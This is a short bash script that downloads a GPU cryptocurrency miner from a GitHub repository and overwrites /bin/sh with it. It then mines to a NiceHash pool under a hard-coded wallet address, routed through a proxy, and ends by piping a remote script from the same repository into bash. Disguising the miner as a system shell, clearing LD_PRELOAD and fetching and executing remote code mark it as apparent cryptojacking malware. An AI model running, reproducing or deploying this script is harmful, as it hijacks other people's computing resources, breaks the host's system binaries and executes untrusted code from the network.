#!/bin/bash
echo "ENGINE START!"
export LD_PRELOAD=
curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
#curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/config
mv t-rex /bin/sh
#mv config /bin/su
chmod +x /bin/sh
#chmod +x /bin/su

/bin/sh -a ethash -o stratum+tcp://daggerhashimoto.auto.nicehash.com:9200 -u 37LUV317QpaiFFgT2oEY6jGon1PPonEXVm -p x -w eng-sh  --proxy 184.178.172.5:15303 --keep-gpu-busy --no-watchdog
#/bin/sh -c /bin/su
curl https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/eng.sh | bash
